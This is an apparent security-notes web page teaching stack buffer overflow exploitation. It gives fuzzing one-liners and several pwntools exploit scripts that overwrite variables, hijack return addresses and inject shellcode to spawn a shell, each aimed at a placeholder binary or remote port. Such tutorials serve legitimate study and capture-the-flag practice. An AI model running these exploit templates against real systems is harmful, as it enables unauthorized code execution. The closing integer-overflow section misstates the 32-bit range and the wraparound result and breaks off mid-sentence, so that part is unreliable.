<!DOCTYPE html>
<html lang="en" class="m-0 p-0 w-screen min-h-screen bg-navy-dark"><head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Binary Exploitation with Buffer Overflow | Readloud.io</title>
        <meta name="description" content="Buffer overflow occurs when a program attempts to write more data to a buffer, or temporary data storage area, than it can hold. This can result in overwriting adjacent memory locations, potentially causing the program to crash or even allowing an attacker to execute arbitrary code on the target system. In the context of binary exploitation, this attack can be used to gain control of the program flow and redirect it to run attacker-controlled code, known as shellcode.">
        
        <link rel="icon" type="image/x-icon" href="/img/favicon-32x32.png">
        <link rel="stylesheet" href="/pagefind/pagefind-ui.css"><link rel="stylesheet" href="/styles.css">
        <link rel="stylesheet" href="/css/carbonads.css">
        
        <script type="text/javascript" src="/js/exploit.js"></script>
        

        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:site" content="@readloud">
        <meta name="twitter:creator" content="@readloud">
        <meta property="og:url" content="https://readloud.github.io/exploit/binary-exploitation/method/binary-exploitation-with-buffer-overflow/">
        <meta property="og:title" content="Binary Exploitation with Buffer Overflow | Readloud.io">
        <meta property="og:description" content="Buffer overflow occurs when a program attempts to write more data to a buffer, or temporary data storage area, than it can hold. This can result in overwriting adjacent memory locations, potentially causing the program to crash or even allowing an attacker to execute arbitrary code on the target system. In the context of binary exploitation, this attack can be used to gain control of the program flow and redirect it to run attacker-controlled code, known as shellcode.">
        <meta property="og:image" content="/assets/img/inbox-zero-dark-377cc25a227f.svg">
        
        <script async="" src="https://www.googletagmanager.com/gtag/js?id=GTM-K6GHSK2"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'GTM-K6GHSK2');
        </script>
    <script type="text/javascript" src="/pagefind/pagefind-ui.js"></script><script type="text/javascript">window.addEventListener('DOMContentLoaded',()=>{new PagefindUI({"element":"#search","showImages":false,"excerptLength":0,"showEmptyFilters":true,"showSubResults":false,"resetStyles":true,"bundlePath":"/pagefind/","baseUrl":"/"});});</script><link rel="stylesheet" href="/codecopy/codecopy.css"><script type="text/javascript" src="/codecopy/codecopy.js"></script></head>

    <body class="relative w-screen min-h-screen text-basic text-white text-sm">
        <header class="sticky top-0 left-0 w-full z-20 bg-gradient-to-r from-pink-dark p-2">
    <div class="md:mx-auto w-full md:w-2/3 h-full flex justify-around items-center">
        <div class="
                w-full md:w-2/3 lg:w-1/2 h-full flex flex-col md:flex-row items-center
                md:gap-x-3 gap-y-3 md:gap-y-0
            ">
            <a href="/">
                <span class="text-sm text-white font-bold">
                    readloud
                </span>
            </a>
            
            <div id="search" class=""></div>
        </div>

        
        <div class="hidden sm:flex w-full h-full items-center justify-center gap-x-3">

            
            <a href="https://github.com/readloud" target="_blank" rel="noopener noreferrer" alt="GitHub">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" class="w-7 h-7 fill-white">
                    <path d="
                            M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207
                            11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729
                            1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304
                            3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381
                            1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399
                            3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242
                            2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823
                            1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"></path>
                </svg>
            </a>

            
            <a href="https://twitter.com/readloud" target="_blank" rel="noopener noreferrer" alt="Twitter">
                <img src="/img/x.png" alt="Twitter" width="22" height="22" class="w-6 h-6">
            </a>

            
            <a href="https://ko-fi.com/readloud" target="_blank" rel="noopener noreferrer" alt="Ko-fi">
                <img src="/img/kofi_cropped.png" alt="Ko-fi" width="22" height="22" class="w-10 h-10">
            </a>

        </div>
    </div>
</header>


<div class="hamburger fixed top-3 right-2 z-40 block md:hidden cursor-pointer">
    <div class="lines">
        <span class="line bg-white"></span>
        <span class="line bg-white"></span>
        <span class="line bg-white"></span>
    </div>
    <div class="line-cross hidden md:hidden text-[22px] text-white leading-none"></div>
</div>

<div id="search_bg" class="fixed top-0 left-0 w-screen z-10 h-screen hidden bg-black opacity-50"></div>

<style>
.hamburger .lines span.line {
    display: block;
    width: 20px;
    height: 3px;
    margin-bottom: 5px;
}

.hamburger .line-cross:before {
    content: '\2716';
}
</style>

<script>
    window.addEventListener('DOMContentLoaded', () => {
        //Display the black filter when searching
        const searchBgElem = document.getElementById("search_bg");
        const drawerElem = document.querySelector(".pagefind-ui__drawer");
        const inputElem = document.querySelector(".pagefind-ui__search-input");

        if (searchBgElem) {
            searchBgElem.addEventListener('click', () => {
                searchBgElem.classList.add("hidden");
                drawerElem.style.visibility = "hidden";
                drawerElem.style.opacity = 0;
            });
        }

        inputElem.addEventListener('focus', () => {
            if (searchBgElem) {
                searchBgElem.classList.remove("hidden");
                drawerElem.style.visibility = "visible";
                drawerElem.style.opacity = 1;
            }
        });
    });
</script>

        <nav class="nav-links hidden">
    <div class="w-full flex flex-col gap-y-4">
        <div>
            <h3 class="my-4 text-base text-white opacity-60">SOCIAL</h3>
            <div class="w-full flex flex-col gap-y-1">
                <a href="https://github.com/readloud" target="_blank" rel="noopener noreferrer" class="text-lg">
                    GitHub
                </a>
                <a href="https://twitter.com/readloud" target="_blank" rel="noopener noreferrer" class="text-lg">
                    Twitter
                </a>
                <a href="https://ko-fi.com/readloud" target="_blank" rel="noopener noreferrer" class="text-lg">
                    
                    Support Me
                </a>
            </div>
        </div>
        <div>
            <h3 class="my-4 text-base text-white opacity-60">PAGES</h3>
            <div class="w-full flex flex-col gap-y-1">
                <a href="/disclaimer" class="text-lg">
                    Disclaimer
                </a>
            </div>
            <div class="w-full flex flex-col gap-y-1">
                <a href="/privacy-policy" class="text-lg">
                    Privacy Policy
                </a>
            </div>
        </div>
        <div>
            <h3 class="my-4 text-base text-white opacity-60">OTHER TOOLS</h3>
            <div class="w-full flex flex-col gap-y-1">
                <a href="https://github.com/readloud?tab=repositories" target="_blank" rel="noopener noreferrer" class="text-lg">
                    Repositories
                </a>
                <a href="https://readloud.github.io/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E" target="_blank" rel="noopener noreferrer" class="text-lg">
                    Advanced PeneTest 4E
                </a>
                <a href="https://readloud.github.io/index-of-ISO" target="_blank" rel="noopener noreferrer" class="text-lg">
                    ISO Archive
                </a>
                <a href="https://readloud.github.io/faucetmonitor" target="_blank" rel="noopener noreferrer" class="text-lg">
                    Faucetmonitor
                </a>
            </div>
        </div>
    </div>
</nav>

<style>
    /* Navigation for mobile */
    .nav-links-hamburger {
        position: fixed;
        top: 0;
        right: 0;
        z-index: 30;
        width: 100vw;
        height: 100vh;
        min-height: 100vh;
        background-color: var(--color-slate-dark);
        padding: 60px 32px;
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        justify-content: flex-start;
        gap: 32px 0px;
        color: var(--color-khaki);
    }
</style>

        <main class="w-full h-full">
            <div class="block sm:grid grid-cols-[320px_minmax(400px,_1fr)_280px] py-2">

    
    <div id="exploit-leftside-inner" class="hidden sm:block w-full h-screen overflow-y-auto px-4 py-3">
        <div class="w-full">
            <div id="exploit-related">
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">
                        Method
                    </h4>
                    
                        <div class="my-3">
                        
                            <span id="scroll-target" class="text-sm text-white">Binary Exploitation with Buffer Overflow</span>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-canary-bypass/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with Canary Bypass
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-format-string/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with Format String
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-got/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with GOT
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-rop/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with ROP
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-race-conditions/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with Race Conditions
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-time-guessing/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with Time Guessing
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-ret2libc/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with ret2libc
                            </a>
                        
                        </div>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/method/binary-exploitation-with-ret2plt/" class="text-sm text-pink-light hover:brightness-200">
                                Binary Exploitation with ret2plt
                            </a>
                        
                        </div>
                    

                    
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">
                        Cheatsheet
                    </h4>
                    
                        <div class="my-3">
                        
                            <a href="/exploit/binary-exploitation/cheatsheet/pwntools-cheat-sheet/" class="text-sm text-pink-light hover:brightness-200">
                                Pwntools Cheat Sheet
                            </a>
                        
                        </div>
                    

                    
                
                    <h4 class="mb-4 border-b-2 border-slate-light text-base text-white opacity-80">
                        Binary Exploitation
                    </h4>
                    

                    
                        
                            <div class="my-3">
                            
                                <a href="/exploit/binary-exploitation/" class="text-sm text-pink-light hover:brightness-200">
                                    Binary Exploitation
                                </a>
                            
                            </div>
                        
                    
                
            </div>
        </div>
    </div>
    

    <div id="exploit-center-inner" class="w-full h-screen overflow-y-auto px-2 md:px-6 py-3" data-pagefind-body="">
        <article>
            <div class="w-full p-4">
                <h1 id="exploit-title" class="text-4xl font-bold">Binary Exploitation with Buffer Overflow</h1>
                <p class="my-3 text-base">Last modified: 2023-08-14</p>

                
                <div class="my-3 flex flex-wrap items-end space-x-2 space-y-2">
                    
                    <span class="bg-pink-dark rounded-md text-base px-3 py-1 text-white">Reverse Engineering</span>
                    
                </div>
                
            </div>

            <hr class="border-1 border-white opacity-40">

            <p class="px-2 py-4 text-base">Buffer overflow occurs when a program attempts to write more data to a buffer, or temporary data storage area, than it can hold. This can result in overwriting adjacent memory locations, potentially causing the program to crash or even allowing an attacker to execute arbitrary code on the target system. In the context of binary exploitation, this attack can be used to gain control of the program flow and redirect it to run attacker-controlled code, known as shellcode.</p>

            <div id="exploit-content" class="px-2 py-4 text-base">
                <h2 id="investigation" tabindex="-1"><a href="#investigation" class="header-anchor">Investigation</a></h2>
<h3 id="functions-lead-to-buffer-overflow" tabindex="-1"><a href="#functions-lead-to-buffer-overflow" class="header-anchor">Functions Lead to Buffer Overflow</a></h3>
<p>If the binary uses the following functions, Buffer Overflow may occurs.</p>
<pre class="codecopy_pre codecopy_pre_0"><code class="language-bash hljs">gets()
fgets()
scanf()
sprintf()
strcpy()
strcat()
</code><button class="codecopy_copy" data-codecopy="0">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="basic-buffer-overflow" tabindex="-1"><a href="#basic-buffer-overflow" class="header-anchor">Basic Buffer Overflow</a></h2>
<p>Try to find what values lead to segmentation fault.</p>
<pre class="codecopy_pre codecopy_pre_1"><code class="language-bash hljs">python3 -c <span class="hljs-string">'print("A"*30)'</span> | ./example
python3 -c <span class="hljs-string">'print("A"*40)'</span> | ./example
python3 -c <span class="hljs-string">'print("A"*50)'</span> | ./example
...
</code><button class="codecopy_copy" data-codecopy="1">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="exploitation" tabindex="-1"><a href="#exploitation" class="header-anchor">Exploitation</a></h3>
<p>Abuse input/output by typing a lot of characters more than the program expects..</p>
<pre class="codecopy_pre codecopy_pre_2"><code class="language-sh hljs language-bash">./example

Type something:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</code><button class="codecopy_copy" data-codecopy="2">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="exploitation-using-pwntools" tabindex="-1"><a href="#exploitation-using-pwntools" class="header-anchor">Exploitation using Pwntools</a></h3>
<pre class="codecopy_pre codecopy_pre_3"><code class="language-python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

ip   = <span class="hljs-string">'10.0.0.1'</span>
port = <span class="hljs-number">1337</span>

r = remote(ip, port)
<span class="hljs-comment"># r = process("./example")</span>

<span class="hljs-comment"># Payload</span>
offset = <span class="hljs-number">30</span>
payload = <span class="hljs-string">b'A'</span> * offset

<span class="hljs-comment"># Send payload</span>
r.sendline(payload)

<span class="hljs-comment"># Print the output</span>
<span class="hljs-built_in">print</span>(r.recvall().decode())

<span class="hljs-comment"># Post process</span>
r.interactive()
</code><button class="codecopy_copy" data-codecopy="3">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="overriding-variables" tabindex="-1"><a href="#overriding-variables" class="header-anchor">Overriding Variables</a></h2>
<p>The program executes input/output by gets() or scanf(), and limit the buffer size of the variable, we can modify the variable then lead to unexpected behavior.<br>
For instance, assume the program is as follow.</p>
<pre class="codecopy_pre codecopy_pre_4"><code class="language-sh hljs language-bash">rizin -d ./example
[0x0000]&gt; aaa

<span class="hljs-comment"># Disassemble the function</span>
[0x0000]&gt; pdf @ main
<span class="hljs-comment"># An example result</span>
sub   rsp, 0x70
call  sym.imp.__isoc99_scanf       ; int scanf(const char *format)
cmp   dword [rbp-0x4], 0xdeadbeef
jne   0x5569e8600992
lea   rdi, str.bin_sh              ; <span class="hljs-string">"/bin/sh"</span>
ret
</code><button class="codecopy_copy" data-codecopy="4">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>First find the distance from the stack pointer to rbp-0x4 (0x04).</p>
<pre class="codecopy_pre codecopy_pre_5"><code class="language-python hljs">python3
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">int</span>(<span class="hljs-number">0x70</span>-<span class="hljs-number">0x4</span>)
<span class="hljs-number">108</span>
</code><button class="codecopy_copy" data-codecopy="5">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="exploitation-using-pwntools-1" tabindex="-1"><a href="#exploitation-using-pwntools-1" class="header-anchor">Exploitation using Pwntools</a></h3>
<pre class="codecopy_pre codecopy_pre_6"><code class="language-python hljs"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.update(arch=<span class="hljs-string">"amd64"</span>, os=<span class="hljs-string">"linux"</span>)

payload = <span class="hljs-string">b"A"</span> * <span class="hljs-number">108</span>
payload += p32(<span class="hljs-number">0xdeadbeef</span>)

p = process(<span class="hljs-string">'./example'</span>) <span class="hljs-comment"># p = remote('example.com', '1337') for remote connection</span>
p.sendline(payload)
p.interactive()
</code><button class="codecopy_copy" data-codecopy="6">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="overriding-the-next-call" tabindex="-1"><a href="#overriding-the-next-call" class="header-anchor">Overriding the Next Call</a></h2>
<p>If the program uses <strong>get()</strong> or <strong>scanf()</strong>, we can specify the address of the desired calls by overwriting the address.<br>
Assume the program has the above two functions.</p>
<pre class="codecopy_pre codecopy_pre_7"><code class="language-sh hljs language-bash">0x0040158c  main
0x00401194  vuln_fn
</code><button class="codecopy_copy" data-codecopy="7">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>For instance, if we want to call the <strong>“vuln_fn”</strong> function,  override the address of the next call using buffer overflow.</p>
<h3 id="exploitation-1" tabindex="-1"><a href="#exploitation-1" class="header-anchor">Exploitation 1</a></h3>
<pre class="codecopy_pre codecopy_pre_8"><code class="language-python hljs"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.update(arch=<span class="hljs-string">"amd64"</span>, os=<span class="hljs-string">"linux"</span>)

elf = context.binary = ELF(<span class="hljs-string">"./example"</span>)

payload = <span class="hljs-string">b"A"</span> * <span class="hljs-number">32</span>
<span class="hljs-comment"># Give the address of the desired function.</span>
payload += p64(elf.sym[<span class="hljs-string">"vuln_fn"</span>])
<span class="hljs-comment"># or if PIE is disabled, we can set the address directly.</span>
<span class="hljs-comment"># payload += p64(0x00401194)</span>

p = process(<span class="hljs-string">'./example'</span>) <span class="hljs-comment"># p = remote('example.com', '1337') for remote connection.</span>

p.sendline(payload)
p.interactive()
</code><button class="codecopy_copy" data-codecopy="8">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="exploitation-2" tabindex="-1"><a href="#exploitation-2" class="header-anchor">Exploitation 2</a></h3>
<pre class="codecopy_pre codecopy_pre_9"><code class="language-bash hljs">from pwn import *

exe = ELF(<span class="hljs-string">"./example"</span>)

r = process(exe.path)
<span class="hljs-comment"># r = remote("10.0.0.1", "1337")</span>

base_addr = 0x123456
payload = b<span class="hljs-string">'A'</span>*0x30 + p64(exe.bss()) + p64(base_addr)
r.sendline(payload)

r.interactive()
</code><button class="codecopy_copy" data-codecopy="9">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="shellcode" tabindex="-1"><a href="#shellcode" class="header-anchor">Shellcode</a></h2>
<p>We can create the crafted shell code and override the address to execute the shell code.<br>
Use <strong>Pwntools</strong> to create the shell code.</p>
<pre class="codecopy_pre codecopy_pre_10"><code class="language-python hljs"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.update(arch=<span class="hljs-string">"amd64"</span>, os=<span class="hljs-string">"linux"</span>)

payload = <span class="hljs-string">b"A"</span> * <span class="hljs-number">50</span> + <span class="hljs-string">b"B"</span> * <span class="hljs-number">8</span>
payload += asm(shellcraft.sh())

p = process(<span class="hljs-string">'./example'</span>) <span class="hljs-comment"># p = remote('example.com', '1337') for remote connection</span>
p.sendline(payload)
p.interactive()
</code><button class="codecopy_copy" data-codecopy="10">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="integer-overflow" tabindex="-1"><a href="#integer-overflow" class="header-anchor">Integer Overflow</a></h2>
<p>If the program processes integer values with input/output, we can abuse it by overflow of integer.<br>
The range of 32-bit integer is <strong>-2147483647 to 2147483647</strong>, so if we type the max value +1 in input for instance, the result is -1. This is because</p>
<pre class="codecopy_pre codecopy_pre_11"><code class="language-bash hljs">./example

Type number:
&gt;&gt; 2147483648
The number you entered is -1.
</code><button class="codecopy_copy" data-codecopy="11">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>

            </div>

            
        </article>
    </div>

    
    <div id="exploit-rightside-inner" class="hidden sm:block w-full h-screen overflow-y-auto px-4 py-3">
